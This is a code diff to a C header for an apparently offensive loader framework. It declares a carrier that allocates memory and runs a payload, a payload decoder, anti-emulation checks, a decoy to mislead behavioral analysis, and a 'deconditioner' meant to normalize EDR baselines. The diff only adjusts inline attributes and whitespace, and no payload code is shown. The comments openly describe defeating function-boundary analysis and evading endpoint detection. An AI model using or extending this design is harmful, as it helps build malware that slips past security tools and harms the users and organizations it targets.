@@ -11,7 +11,6 @@
 // Force-inline: eliminates named call targets in the binary.
 // Applied to decode_payload and MyVirtualProtect so their code merges
 // into the carrier, defeating function-boundary analysis.
-// New module variants: match FORCE_INLINE on the definition to match this declaration.
 #if defined(__clang__) || defined(__GNUC__)
 #define FORCE_INLINE __attribute__((always_inline)) static inline
 #else
@@ -24,26 +23,26 @@ typedef BOOL (WINAPI *VirtualProtect_t)(LPVOID, SIZE_T, DWORD, PDWORD);
 typedef LPVOID (WINAPI *VirtualAlloc_t)(LPVOID, SIZE_T, DWORD, DWORD);
 
 // Module Interfaces
-// Each module file should implement one of these functions. 
+// Each module file should implement one of these functions.
 // The Fuzzer/Builder will paste the implementation into the final C file.
 
 // Carrier: Responsible for setting up memory and executing payload.
 // Returns 0 on success, non-zero on error.
-FORCE_INLINE int carrier(void);
+int carrier(void);
 
 // Decoder: Decrypts 'len' bytes at 'dest'.
 FORCE_INLINE void decode_payload(char *dest, int len);
 
-// AntiEmulation: Burns resources or checks environment. 
+// AntiEmulation: Burns resources or checks environment.
 // Should return quickly if real, stall/crash if fake.
-FORCE_INLINE void antiemulation(void);
+void antiemulation(void);
 
 // Decoy: Executes benign activity to mislead behavioral analysis.
-FORCE_INLINE void decoy(void);
+void decoy(void);
 
 // Deconditioner: Rehearses the carrier's alloc/write/protect/free pattern
 // with benign data to normalize EDR behavioral baselines.
-FORCE_INLINE void deconditioner(void);
+void deconditioner(void);
 
 // Guardrail: Checks execution environment.
 // Returns 0 if safe to run, non-zero if we should bail.
